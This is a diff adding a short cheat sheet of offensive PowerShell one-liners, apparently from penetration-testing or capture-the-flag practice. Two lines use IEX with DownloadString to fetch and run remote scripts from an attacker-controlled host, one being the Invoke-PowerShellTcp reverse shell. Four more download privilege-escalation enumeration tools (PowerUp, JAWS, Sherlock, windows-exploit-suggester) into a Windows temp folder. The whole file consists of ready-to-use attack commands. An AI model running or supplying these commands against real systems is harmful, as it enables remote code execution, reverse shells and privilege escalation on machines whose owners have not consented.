@@ -1,0 +1,16 @@
+#Run file remotely
+powershell -C IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.24/Invoke-PowerShellTcp.ps1')
+
+powershell -C IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.24/powershell_attack.txt')
+
+
+#Download file
+(new-object System.Net.WebClient).DownloadFile('http://10.10.14.24/powerUp.ps1','C:\Windows\Temp\test\powerup.ps1')
+
+(new-object System.Net.WebClient).DownloadFile('http://10.10.14.24/jaws-enum.ps1','C:\Windows\Temp\test\jaws-enum.ps1')
+
+(new-object System.Net.WebClient).DownloadFile('http://10.10.14.24/Sherlock.ps1','C:\Windows\Temp\test\Sherlock.ps1')
+
+(new-object System.Net.WebClient).DownloadFile('http://10.10.14.24/windows-exploit-suggester.py','C:\Windows\Temp\test\windows-exploit-suggester.py')
+
+
